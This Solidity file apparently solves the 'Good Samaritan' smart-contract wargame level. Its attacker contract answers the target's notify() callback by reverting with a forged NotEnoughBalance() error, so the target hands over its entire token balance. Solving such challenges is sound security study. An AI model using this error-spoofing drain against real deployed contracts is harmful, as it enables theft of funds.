// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan{
    function requestDonation() external returns(bool);
}

contract SamaritaninHack {
    IGoodSamaritan target;

    error NotEnoughBalance();

    constructor(IGoodSamaritan _target) {
        target = _target;
    }

    function attack() external {
        target.requestDonation();
    }

    // inside transfer() function, is dest_ address is contract, it will be notify(by calling notify() function)
    // We can use this function to revert with NotEnoughBalance() error and that will allow to call transferRemainder() [whole amount holded by contract]
    function notify(uint256 _amount) public {
        if(_amount == 10) { // this check is needed becasuse we don't want to revert second transfer with whole amount of tokens
            revert NotEnoughBalance();
        }
    } 
}
